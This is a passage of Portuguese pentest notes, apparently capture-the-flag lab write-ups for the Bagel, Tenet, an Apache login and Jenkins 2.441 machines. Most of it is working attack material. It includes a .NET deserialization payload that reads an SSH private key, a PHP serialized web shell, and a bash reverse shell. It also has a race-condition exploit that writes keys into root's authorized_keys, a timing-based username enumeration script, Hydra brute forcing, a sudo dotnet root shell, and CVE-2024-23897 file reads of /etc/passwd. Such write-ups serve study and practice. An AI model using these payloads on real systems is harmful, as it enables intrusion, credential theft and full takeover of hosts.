    A classe também tem três campos privados: `order_filename` do tipo string , `order_info` do tipo string , e file do tipo File que é uma instância de outra classe.
    Um ponto de interesse aqui é a propriedade `RemoveOrder`. É do tipo objeto e especifica os métodos get e set, mas não está realmente implementada. Tendo em conta as configurações definidas na classe `Handler`, esta propriedade pode potencialmente introduzir uma vulnerabilidade relacionada com a desserialização insegura, uma vez que podemos teoricamente definir um tipo arbitrário para a mesma, que será inferido após a desserialização.
    
    File
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2039.png)
    
    A classe File tem duas propriedades: ReadFile e WriteFile .
    
    1. A propriedade `ReadFile` lê o conteúdo de um ficheiro definindo a propriedade filename para o nome de ficheiro especificado e, em seguida, chama o método ReadContent para ler o conteúdo do ficheiro e armazená-lo na variável file_content.
    2. A propriedade `WriteFile`escreve o conteúdo especificado num ficheiro, chamando o método WriteContent com o nome de ficheiro e o conteúdo especificados.
    3. O método `ReadContent`lê o conteúdo do ficheiro especificado utilizando o método File.ReadLines e a codificação UTF-8, e junta as linhas com um carácter de nova linha para criar uma única cadeia de caracteres. Se o ficheiro não for encontrado ou se for lançada uma exceção, a variável file_content é definida como "Ordem não encontrada!".
    4. O método `WriteContent` escreve o conteúdo especificado no ficheiro especificado utilizando o método File. WriteAllText. Se for lançada uma exceção, a variável IsSuccess é definida como "A operação falhou"; caso contrário, é definida como "A operação foi bem sucedida".
    
    A classe tem quatro campos privados: `file_content` , que contém o conteúdo do ficheiro; `IsSuccess` , que contém uma mensagem de sucesso para a operação de escrita; directory , que contém o caminho para o diretório onde o ficheiro está localizado; e filename , que contém o nome do ficheiro.
    
    Sumario
    
    Vamos resumir as nossas conclusões até à data:
    
    1. Bagel: Esta classe é o ponto de entrada da aplicação, responsável por iniciar o servidor Web e configurar o encaminhamento.
    2. Handler : Esta classe contém um método Deserialize que desserializa uma string JSON para um objeto do tipo Base . A definição TypeNameHandling está definida como 4, o que inclui o nome do tipo .NET no JSON serializado quando o tipo de objeto real não corresponde ao tipo declarado. Isto introduz a possibilidade de ataques de desserialização polimórficos se o processo de desserialização não estiver devidamente protegido.
    3. Base: esta classe herda da classe Pedidos e contém propriedades como UserId, Session e Time.
    4. Pedidos : Esta classe contém propriedades para RemoveOrder , WriteOrder e ReadOrder . A propriedade RemoveOrder não tem implementação, mas é do tipo objeto e tem um setter, o que pode levar a vulnerabilidades de desserialização inseguras. As propriedades WriteOrder e ReadOrder interagem com uma instância da classe File para escrever e ler o conteúdo do ficheiro.
    5. Ficheiro: Esta classe fornece métodos auxiliares para ler e escrever conteúdos de ficheiros. Inclui propriedades para ReadFile e WriteFile, bem como métodos para ler e escrever conteúdos de ficheiros
    
    Em termos gerais, o fluxo de código está estruturado da seguinte forma: um pedido Web chega e é tratado pelo controlador adequado. O controlador chama então o serviço apropriado para executar a lógica comercial, que por sua vez interage com o repositório para recuperar ou persistir os dados. O repositório utiliza a classe auxiliar File para ler ou escrever dados de/para um ficheiro local.
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2040.png)
    
    Foothold
    
    Agora que temos uma compreensão da base de código, vamos examinar a propriedade RemoveOrder, que, como vimos, não foi implementada. Como RemoveOrder tem um setter, poderíamos potencialmente atribuir um tipo arbitrário que será inferido devido às configurações definidas na classe Handler. Pretendemos tirar partido da classe File para contornar a sanitização no método ReadOrder e ler ficheiros arbitrários no sistema de destino.
    Relembramos o código-fonte da aplicação web que obtivemos através da travessia de caminhos; mais especificamente, o ponto final /orders que interage com o servidor WebSocket.
    
    ```python
    @app.route('/orders')
    def order(): # don't forget to run the order app first with "dotnet <path to .dll>"
    command. Use your ssh key to access the machine.
    try:
    ws = websocket.WebSocket() 
    ws.connect("ws://127.0.0.1:5000/") # connect to order app
    order = {"ReadOrder":"orders.txt"}
    data = str(json.dumps(order))
    ws.send(data)
    result = ws.recv()
    return(json.loads(result)['ReadOrder'])
    except:
    return("Unable to connect")
    ```
    
    O ponto final utiliza ReadOrder para aceder ao ficheiro orders.txt. A partir da nossa revisão do código-fonte, descobrimos que a entrada é higienizada, pelo que não poderemos utilizar esta diretiva.
    O nosso objetivo agora é verificar se esta aplicação funciona como previsto. Enquanto a aplicação web usa ReadOrder , vamos tentar escrever no ficheiro orders.txt, usando WriteOrder.
    
    ```python
    import websocket, json
    ws = websocket.WebSocket()
    ws.connect("ws://bagel.htb:5000/")
    json_value= {"WriteOrder": "test"}
    data = str(json.dumps(json_value))
    ws.send(data)
    print(ws.recv())
    ws.close()
    ```
    
    Este script Python estabelece uma ligação WebSocket à aplicação bagel_server, que está à escuta na porta 5000 .
    No script, estamos a criar um objeto JSON com o par chave-valor `{"WriteOrder": "test"}` . Este objeto é então enviado através da ligação WebSocket para o servidor. A chave WriteOrder corresponde à propriedade
    WriteOrder na classe Orders, e estamos a definir o seu valor para "test". No contexto da aplicação, esta operação deve fazer com que a cadeia de caracteres "teste" seja escrita no ficheiro orders.txt.
    A chamada `ws.recv()` espera então por uma resposta do servidor, que imprimimos. Isto dar-nos-á uma ideia de como o servidor trata o nosso pedido WriteOrder, permitindo-nos verificar a nossa compreensão do comportamento da aplicação e confirmar quaisquer potenciais vulnerabilidades relacionadas com a propriedade WriteOrder.
    No contexto da nossa análise, este teste é útil para compreender como a aplicação trata as operações de escrita de ficheiros e pode ajudar-nos a descobrir potenciais problemas de segurança, tais como controlos de acesso inadequados ou tratamento inseguro de dados.
    Vamos executar o script.
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2041.png)
    
    Apesar do parâmetro session: `"Unauthorized"`, a mensagem WriteOrder indica que a operação
    foi bem-sucedida. Usamos o curl para ler o arquivo usando o ponto de extremidade `/orders`.
    
    `curl [http://bagel.htb:8000/orders](http://bagel.htb:8000/orders)`
    
    O facto de ter devolvido "teste" como resposta confirma que o pedido WebSocket anterior que enviámos foi de facto bem sucedido na escrita de "teste" no ficheiro orders.txt.
    Depois de confirmar que podemos usar diretamente as propriedades da classe Order, vamos agora pensar na propriedade RemoveOrder, que não foi implementada. Em combinação com a configuração TypeNameHandling mencionada anteriormente, bem como a propriedade RemoveOrder sendo do tipo object , podemos atribuir tipos arbitrários a ela que serão inferidos durante a desserialização. Portanto, podemos criar um payload JSON específico com o objetivo de ler arquivos arbitrários na máquina de destino, ignorando a sanitização ReadOrder e usando diretamente a propriedade ReadFile.
    O seguinte payload vem à mente, visando a chave SSH privada que, lembramos, foi referenciada no código-fonte do aplicativo Flask
    
    ```python
    {
    	"RemoveOrder": {
    	"$type": "bagel_server.File, bagel",
    	"ReadFile": "../../../../home/phil/.ssh/id_rsa"
    	 }
    }
    
    ```
    
    Neste payload, especificamos o campo $type como `bagel_server.File`, bagel , o que faz com que o desserializador crie uma instância da classe File. Podemos então utilizar o método ReadFile deste objeto File para ler o conteúdo de um ficheiro arbitrário do sistema de ficheiros, e estamos a explorar isto para ler a chave SSH privada do utilizador phil . Nos sistemas baseados em Unix, as chaves privadas são normalmente armazenadas no diretório .ssh dentro do diretório home do utilizador, e o nome predefinido para o ficheiro da chave privada é `id_rsa`.
    O nosso script atualizado tem o seguinte aspeto:
    
    `{ "RemoveOrder" : { "$type" : "bagel_server.File, bagel", "ReadFile":"../../../../../home/phil/.ssh/id_rsa" } }`
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2042.png)
    
    Nós exploramos com sucesso a vulnerabilidade e ganhamos acesso à chave SSH do phil.
    Como a formatação da chave está desativada, copiamos o conteúdo do ReadFile para um arquivo chamado temp.key .
    Em seguida, usamos a ferramenta sed para substituir todas as ocorrências da sequência de caracteres \n por um caractere de nova linha. É necessário o ficheiro `temp.key` como entrada e a saída é impressa na consola.
    
    Lateral Movement
    
    Recordamos a classe db dentro de bagel.dll , onde encontrámos uma palavra-passe para o utilizador com o ID de dev , que provavelmente significa "developer" (programador).
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2043.png)
    
    Como é comum as pessoas reutilizarem as palavras-passe, podemos tentar utilizar esta palavra-passe para outras contas e ver se funciona.
    Tentamos mudar de utilizador, utilizando su , e a palavra-passe descoberta `k8wdAYYKyhnjg3K` .
    
    `su developer`
    
    Privilege Escalation
    
    Ao investigar as permissões do utilizador programador, descobrimos que ele tem a capacidade de executar o comando `/usr/bin/dotnet` como o utilizador raiz sem necessitar de uma palavra-passe, tal como indicado por (root)
    `NOPASSWD: /usr/bin/dotnet` .
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2044.png)
    
    [dotnet | GTFOBins](https://gtfobins.github.io/gtfobins/dotnet/)
    
    `sudo /usr/bin/dotnet fsi`
    `System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;`
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2045.png)
    
- Wordpress-serielized
    
    Enumeration
    
    ```python
    nmap -T4 -sC -sV -p- 10.129.26.137 
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-02 13:55 BST
    Nmap scan report for 10.129.26.137
    Host is up (0.063s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 ccca43d44ce74ebf26f427eab875a8f8 (RSA)
    |   256 85f3acba1a6a0359e27e8647e73e3c00 (ECDSA)
    |_  256 e7e99addc34a2f7ae1e05da2b0ca44a8 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 42.23 seconds
    ```
    
    Descobrimos uma web page apache 2.4.29
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2046.png)
    
    Depois de fazermos um brute force de neste ip encontramos Wordpress.
    
    ```python
    gobuster dir -u http://10.129.26.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html
    ===============================================================
    Gobuster v3.1.0
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.129.26.137
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.1.0
    [+] Extensions:              html
    [+] Timeout:                 10s
    ===============================================================
    2024/04/02 14:23:30 Starting gobuster in directory enumeration mode
    ===============================================================
    /index.html           (Status: 200) [Size: 10918]
    /wordpress            (Status: 301) [Size: 318]
    ```
    
    Descobrimos que existe uma host `tenet.htb`
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2047.png)
    
    Ao procurar as publicações vemos que existem 2 utilizadores, neil e protagonist, isto é confirmado no login da Wordpress em que dizia que a password do utilizador estava incorreta.
    
    Ao ler-mos as publicações, vemos que existe um backup, e vamos utilizar o gobuster para descobrir.
    
    `did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!`
    
    ```python
    gobuster dir -u http://10.129.26.137 -w word -d -x .php
    ===============================================================
    Gobuster v3.1.0
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.129.26.137
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                word
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.1.0
    [+] Extensions:              php
    [+] Timeout:                 10s
    ===============================================================
    2024/04/02 14:58:44 Starting gobuster in directory enumeration mode
    ===============================================================
    /sator.php            (Status: 200) [Size: 63]
    /sator.php.bak        (Status: 200) [Size: 514]
    
    ```
    
    Para fazer o download do `http://10.129.26.137/sator.php.bak`.
    
    ```python
    <?php
    class DatabaseExport
    {
    	public $user_file = 'users.txt';
    	public $data = '';
    
    	public function update_db()
    	{
    		echo '[+] Grabbing users from text file <br>';
    		$this-> data = 'Success';
    	}
    	public function __destruct()
    	{
    		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
    		echo '[] Database updated <br>';
    	//	echo 'Gotta get this working properly...';
    	}
    }
    
    $input = $_GET['arepo'] ?? '';
    $databaseupdate = unserialize($input);
    
    $app = new DatabaseExport;
    $app -> update_db();
    ?>
    ```
    
    O código define uma classe chamada `DatabaseExport` que utiliza a função `magic __destruct()` para criar um ficheiro chamado users.txt preenchido com dados definidos pelo utilizador.
    Os dados devem ser lidos a partir do parâmetro arepo usando um pedido GET e desserializados, no entanto, os dados nunca são passados para a classe instanciada, uma vez que se nota que o código ainda não funciona corretamente. Finalmente, a função `update_db()` é chamada.
    
    É necessário criar um código php para criar um código que serializa os dados. 
    
    É possível explorar a funcionalidade acima e, especificamente, a função unserialize para abusar da classe DatabaseExport e escrever um shell na pasta do servidor Web que pode ser usado para execução remota de código. Primeiro, precisamos de gerar uma carga útil serializada. Considere o seguinte código.
    
    ```php
    <?php
    class DatabaseExport
    {
     public $user_file='attack.php';
     public $data = '<?php system($_GET["cmd"]);?>';
    }
    $payload = new DatabaseExport;
    echo (serialize($payload));
    ?>
    ```
    
    É criada uma instância da classe `DatabaseExport` e a variável de dados é preenchida com uma shell Web básica que recebe entradas do parâmetro cmd e utiliza a função de sistema para executar comandos. Estes dados serão escritos num ficheiro chamado `attack.php`. Por fim, o `payload` é serializado. Colocamos o código dentro de um ficheiro chamado `generate.php` e executamo-lo da seguinte forma.
    
    `php generate.php`
    
    ```php
    O:14:"DatabaseExport":2:{s:9:"user_file";s:10:"attack.php";s:4:"data";s:29:"<?php
    system($_GET["cmd"]);?>";}
    ```
    
    Agora colocamos os dados no site  
    
    `http://10.10.10.223/sator.php?arepo=O:14:"DatabaseExport":2:
    {s:9:"user_file";s:10:"attack.php";s:4:"data";s:29:"<?php system($_GET["cmd"]);?>";}`
    
    ```php
    [+] Grabbing users from text file
    [] Database updated
    [] Database updated
    ```
    
    E para aceder a essa shell `http://10.10.14.223/attack.php?cmd=id` .
    
    A partir daqui, conseguimos obter uma shell a partir daqui. 
    
    ```php
    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
    ```
    
    Movimento lateral 
    
    Vemos que existe um ficheiro que tem dados de acesso ao mysql 
    
    ```php
    / ** MySQL settings - You can get this info from your web host ** //
    /** The name of the database for WordPress */
    define( 'DB_NAME', 'wordpress' );
    /** MySQL database username */
    define( 'DB_USER', 'neil' );
    /** MySQL database password */
    define( 'DB_PASSWORD', 'Opera2112' );
    /** MySQL hostname */
    define( 'DB_HOST', 'localhost' )
    ```
    
    Com estes dados conseguimos aceder ao mysql. Ao explorar os dados na base de dados não vemos nenhumas credenciais sem em texto corrido, só credenciais.
    
    Com estas credencias do `mysql` conseguimos aceder ao utilizador `neil` através de ssh.
    
    `ssh neil@10.10.14.116`
    
    Ao executar mos o comando `sudo -l` vemos que tem `/usr/local/bin/enableSSH.sh` 
    
    ```php
    #!/bin/bash
    
    checkAdded() {
    
    	sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)
    
    	if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
    
    		/bin/echo "Successfully added $sshName to authorized_keys file!"
    
    	else
    
    		/bin/echo "Error in adding $sshName to authorized_keys file!"
    
    	fi
    
    }
    
    checkFile() {
    
    	if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
    
    		/bin/echo "Error in creating key file!"
    
    		if [[ -f $1 ]]; then /bin/rm $1; fi
    
    		exit 1
    
    	fi
    
    }
    
    addKey() {
    
    	tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
    
    	(umask 110; touch $tmpName)
    
    	/bin/echo $key >>$tmpName
    
    	checkFile $tmpName
    
    	/bin/cat $tmpName >>/root/.ssh/authorized_keys
    
    	/bin/rm $tmpName
    
    }
    
    key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
    addKey
    checkAdded
    
    ```
    
    A partir daqui 
    
    O script pode ser executado para adicionar uma chave RSA pública hardcodeada ao ficheiro authorized_keys do utilizador root. Especificamente, existem três funções no script, `addKey` , `checkFile` e `checkAdded` .
    A primeira função usa o comando mktemp para gerar um nome de arquivo temporário em /tmp onde a chave RSA será armazenada. Vale a pena notar que a opção -u não é segura de acordo com a página de manual do mktemp e é apenas utilizada para imprimir um nome de ficheiro sem realmente criar o ficheiro. O arquivo é então criado usando touch e uma umask de 110 é usada, o que significa que o arquivo pode ser escrito por todos no sistema. A função `checkFile` é então chamada e o conteúdo da chave RSA é colocado no ficheiro recém-criado. A função `checkFile` verifica o nome SSH que foi adicionado no ficheiro `authorized_keys` para se certificar que é `root@ubuntu` e imprime a mensagem correspondente.
    Finalmente, `checkAdded` lê o ficheiro `authorized_keys` para confirmar a adição bem sucedida das chaves. Este script é vulnerável a uma Race Condition devido aos erros apontados e, especificamente, ao uso errado de `mktemp` , ao uso errado de `umask` , ao uso do duplo >> no comando echo, que anexa ao arquivo em vez de sobrescrever e, finalmente, o arquivo temporário é criado em um diretório público e pode ser editado por qualquer usuário.
    
    Primeiro é necessário criar uma  chave `ssh` 
    
    ```bash
    ssh-keygen -f tenet
    Generating public/private rsa key pair.
    Enter passphrase (empty for no passphrase): 
    Enter same passphrase again: 
    Your identification has been saved in tenet
    Your public key has been saved in tenet.pub
    The key fingerprint is:
    SHA256:75tkyO1ZXjn1CXivGiejhdryJvt70h5xLVHvgNnASu8 paulinho13@htb-kwdsimetbb
    The key's randomart image is:
    +---[RSA 3072]----+
    |           ..  . |
    |          . .=. .|
    |         . oo.o .|
    |          . o oo |
    |        S  + = .o|
    |       . +. E +oo|
    |        o.**..+o.|
    |       ooBoB*... |
    |       oB*@+o.   |
    +----[SHA256]-----+
    
    ```
    
    Copiar a chave publica par o ficheiro para fazer brute force do `ssh`.
    
    ```bash
    while true; do
    	for file in $(ls);do
    		if [[ $file == ssh* ]]; then 
    			echo  "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFnJtempDbyG9OWJNo5dRlFCGFJk4fHme3XSeJB6PkG5p+Cf1nnJZP9XyG0zo5aYZBjY6AS/2lWFQREM7B0dip93J60vMneC8N4xL0uXOcLJ5e8Gbnw5c27P8hVr+MgQSuB25jELGCk1GxtOvNaOhXa77QVXz+mgvOnYRL0Ntj+pyhPepYO2nIZ6mnOw96MSyTmVh/3JUors3YXgiXEeWP0XHQQZKx4GOWG+GZVdO+iX3K/6Oi2n7mwBtKMzZgq4Gecmi6z5v/lSm5NRdeMC2LiJVpfm2VWbNBBCaHzXHFAWEacdiHQ6c8/gYp4sf1m3FDbrYxKDN+jdIYnyjLG/+8hGkxVmY7DkJ3baiygWhJWa5FudVl4fO+SZraF9JlZFeK/uz/uofhMbGCQuApNp6K8mcXoSJzz6GdYz7yTFe2SVAC3/qg/sL38Y47g5OvhMWN30ApfLDNSlKyTnFEvQF9rS3zV3G/eRxlROq88po7j38qQDbw83VB2wimBrDWYMk= paulinho13@htb-kwdsimetbb" > $file 
    		fi 
    	done
    done
    ```
    
    Em alternativa existe este codigo que faz de forma parecida o que está em cima.
    
    ```bash
    package main
    import (
     "fmt"
     "path/filepath"
     "io/ioutil"
    )
    func main() {
    contents := []byte("ssh-rsa
    AAAAB3NzaC1yc2EAAAADAQABAAABgQD0e/9r40oZpqy2YdTFkTnZ5AGrjF9Sid4UKEITtihNvt66Or0bMYDpzAF
    GLcuus9bqvxnyHZ5wjIXLAgixfJaNx0pSb5ssug5vPJen1tri8CDXrXGGsvyhOEIP82en8XsPXqiZ9SWEtMSSQf
    CWcjH66GyeM+Uuqmvk6HuukTu3ZjfyP/Lspkid4NnDfDG0HwlmXj1sVG1iIh08kNU0r+xfyA2Ebgk2K2/zJvohR
    gEKObMSr6jq2lK2Xso1iEOVd3KIcDHE5UkH2V1Jlqw4mIQhqN4fOKljhWzDCEWRQEb2hlRiMPiyFSkN8tK+Jyot
    y7CFEdG6vTsu/hxdWESL+L80USxTwyG7BKmn5LyXYS0i+bWoGvgg9mkJZ2Wzv3g+ueycVUEGu7jwJn8Y30fFmZC
    Vqu0vnaUoRDjGslWpsm5fKVdi9SsJvO2AjRhK1ghqHRCXeleN9rpCMnd6jzmVMsHtlghoKJgEBSvA+kfwx9dHZt
    7cyix43mzA/FjgUFH7Zak= trx@parrot\n root@ubuntu");
     for {
     matches, _ := filepath.Glob("/tmp/ssh-*")
     for _, file := range matches {
     fmt.Println(file);
     ioutil.WriteFile(file, contents, 0666);
     fmt.Println("File written successfully");
    } }
    }
    ```
    
    `cd /tmp`
    `chmod +x exploit`
    `./exploit`
    
    Depois corremos primeiro o `exploit` e depois noutro terminal corremos  `sudo /usr/local/bin/enableSSH.sh`. A partir daqui a chave publica foi escrita na `root/authorized_keys` .
    
    A partir daqui podemos aceder `ssh`  `ssh -i tenet root@10.10.14.116` .
    
- Apache
    
    Enum
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2048.png)
    
    Ao observarmos o site tem um login. Vemos também que ao fazer um login, notamos uma diferença de tempo na autenticação. Os utilizadores validos, ou seja, os que existe mesmo, demoram mais tempo a autenticar-se.
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2049.png)
    
    Ao mesmo tempo fazer uma listagem de diretorias, `gobuster dir -u [http://10.129.93.50](http://10.129.93.50/) -w /usr/share/wordlists/dirb/common.txt -x php`
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2050.png)
    
    Nota: Certifique-se de usar o Bash para o comando time, pois outros shells, como o zsh, não o suportam.
    
    A saída mostra que o servidor respondeu em cerca de 1 milissegundo, ou 0,131 segundos. Executando este comando mais algumas vezes, podemos obter um intervalo mais preciso de atrasos entre pedidos e respostas
    e notamos que eles estão em torno de 0,130 a 0,140 segundos.
    Vamos prosseguir com o teste do nome de usuário admin
    
    `time curl -X POST [http://10.129.93.50/login.php\\?login\\=true](http://10.129.93.50/login.php%5C%5C?login%5C%5C=true) --data
    "user=test&password=test" -s | grep Invalid`
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2051.png)
    
    `time curl -X POST [http://10.129.93.50/login.php\\?login\\=true](http://10.129.93.50/login.php%5C%5C?login%5C%5C=true) --data
    "user=admin&password=test" -s | grep Invalid`
    
    O resultado mostra que a resposta chegou após cerca de um segundo e, especificamente, 1,215 segundos. Executando o comando mais algumas vezes, como mostrado anteriormente, obtemos um intervalo de tempo de 1,190 a 1,210 segundos de atraso.
    As descobertas acima sugerem que a página pode ser vulnerável a um ataque de enumeração de canal lateral de tempo que pode ajudar-nos a identificar nomes de utilizador válidos.
    Para automatizar o processo de enumeração de nomes de utilizador, pode ser utilizado o seguinte script bash.
    
    ```bash
    #!/bin/bash
    file="/usr/share/seclist/Usernames/xato-net-10-million-usernames.txt"
    TIMEFORMAT=%R
    threshold="1.190"
     {
     time=$( { time curl -s -X POST http://10.129.93.50/login.php\?login\=true --data
    "user=$1&password=admin" > /dev/null; } 2>&1 )
     if (( $(echo "$time > $threshold" | bc -l) )); then
     echo "$line | $time"
     fi
    }
    while IFS= read -r line
    do
     check_username "$line" &
     sleep 0.01
    done < "$file"
    ```
    
    Vamos usar o repositório SecLists e, mais especificamente, a lista de palavras xato-net-10-million-usernames.txt username wordlist. Definimos a variável ambiental TIMEFORMAT para %R , o que significa que o comando time só produzirá o tempo real que o script levou para ser executado. O parâmetro threshold é usado para identificar nomes de usuário válidos, dependendo do tempo que o pedido levou para ser concluído.
    
    ```bash
    check_username () {
     time=$( { time curl -s -X POST http://10.129.93.50/login.php\?login\=true --data
    "user=$1&password=admin" > /dev/null; } 2>&1 )
     #echo $time
     if (( $(echo "$time > $threshold" | bc -l) )); then
     echo "$line | $time"
     fi
    }
    ```
    
    A função check_usernames envia um pedido de início de sessão para o servidor remoto e mede o tempo que demora a resposta a ser recebida. Se o tempo for superior ao limite, imprime o nome de utilizador que está atualmente a ser testado, bem como o tempo que demorou a receber a resposta.
    
    ```bash
    while IFS= read -r line
    do
     check_username "$line" &
     sleep 0.01
    done < "$file"
    ```
    
    Finalmente, o loop while acima é usado para paralelizar o processo, colocando em segundo plano a função check_usernames e esperando 0,01 segundos antes de enviar um novo pedido, para não inundar o servidor.
    Coloque o script acima em um arquivo chamado `enumerate.sh`, torne-o executável e execute-o.
    
    `chmod +x [enumerate.sh](http://enumerate.sh/)`
    `./enumerate.sh`
    
    O resultado do script mostra que os nomes de utilizador admin e aaron são válidos. Se tentarmos adivinhar a palavra-passe deste utilizador, descobrimos facilmente que as credenciais aaron / aaron são válidas. Também podemos usar o Hydra para automatizar este processo
    
    `hydra -l aaron -P /usr/share/wordlists/rockyou.txt 10.129.93.50 http-post-form
    '/login.php?login=true:user=^USER^&password=^PASS^:Invalid'`
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2052.png)
    
    Administrative Panel
    
- Jenkins 2.441
    
    Nmap
    
    ```bash
    nmap -p$ports -sV -sC 10.129.230.220
    PORT STATE SERVICE VERSION
    22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol
    2.0)
    8080/tcp open http Jetty 10.0.18
    |_http-title: Dashboard [Jenkins]
    ```
    
    Olhando para a parte inferior da página, podemos ver que a versão que está atualmente instalada no no host remoto é a `2.441` . Pesquisando online por potenciais vulnerabilidades, descobrimos que esta versão é afetada pela vulnerabilidade `CVE-2024-23897` que permite que atacantes não autenticados ler ficheiros arbitrários no sistema de ficheiros do controlador Jenkins. Procurando por provas de conceitos disponíveis, encontramos este repositório que usa o jenkins-cli.jar para explorar a vulnerabilidade. Estamos interessados no `jenkins-cli.jar`, porque podemos realmente obter esse arquivo da máquina remota de acordo com a documentação.
    
    ```bash
    wget 10.129.230.220:8080/jnlpJars/jenkins-cli.jar
    java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' help "@/etc/passwd"
    ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    java -jar jenkins-cli.jar help [COMMAND]
    Lists all the available commands or a detailed description of single command.
    COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash)
    ```
    
    Parece que a exploração funcionou e vazamos algumas linhas do arquivo /etc/passwd da
    máquina remota.
    
    Foothold
    
    Agora que confirmamos que o exploit funciona, vamos enumerar o ambiente da instalação do Jenkins.
    O nosso alvo é o ficheiro /proc/self/environ:
    
    ```bash
    java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080'
    help "@/proc/self/environ"
    HOSTNAME=0f52c222a4cc<SNIP>HOME=/var/jenkins_home<SNIP>
    ```
    
    Ao ler as variáveis de ambiente do processo, descobrimos que o diretório HOME está localizado em `/var/jenkins_home` .
    A partir desse diretório, podemos obter o ficheiro `user.txt`.
    
    ```bash
    java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' help "@/var/jenkins_home/user.txt"
    ```
    
    Além disso, notamos que a variável HOSTNAME não está definida como builder ou algo semelhante. Os caracteres aleatórios no nome do host geralmente indicam que estamos a olhar para dentro de um contentor Docker.
    Para prosseguir, nossa melhor opção é criar um contêiner Docker local a partir do repositório oficial do Jenkins.
    
    ```bash
    docker pull jenkins/jenkins:lts-jdk17
    docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:lts-jdk17
    <SNIP>
    Jenkins initial setup is required. An admin user has been created and a password
    generated.
    Please use the following password to proceed to installation:
    cf3fcaabae294440bbcd88da6c41ca59
    <SNIP>
    ```
    
    Agora, vamos visitar a nossa instância Jenkins em `http://127.0.0.1:8080` , para concluir a instalação.
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2053.png)
    
    Em seguida, selecionados plug-ins que pretendemos instalar e selecionamos Nenhum para acelerar o processo de instalação.
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2054.png)
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2055.png)
    
    Em seguida, criamos o primeiro utilizador `Admin`.
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2056.png)
    
    Na página seguinte, chamada Instance Configuration (Configuração da instância), basta selecionar Not now e concluir a instalação.
    Agora, `CTRL+c` o comando docker e reiniciamos para obter um shell.
    
    ```bash
    docker ps -a
    CONTAINER ID IMAGE
    63cea5c8dd6e jenkins/jenkins:lts-jdk17
    docker start 63c
    docker exec -it 63c bash
    ```
    
    Agora que estamos dentro do contentor, podemos ir para o diretório HOME do Jenkins e começar a procurar.
    
    ```bash
    jenkins@63cea5c8dd6e:/$ cd ~
    jenkins@63cea5c8dd6e:~$ ls
    <SNIP> users
    ```
    
    Existe um diretório interessante chamado users ; vamos ver o conteúdo do diretório.
    
    ```bash
    jenkins@63cea5c8dd6e:~$ ls users
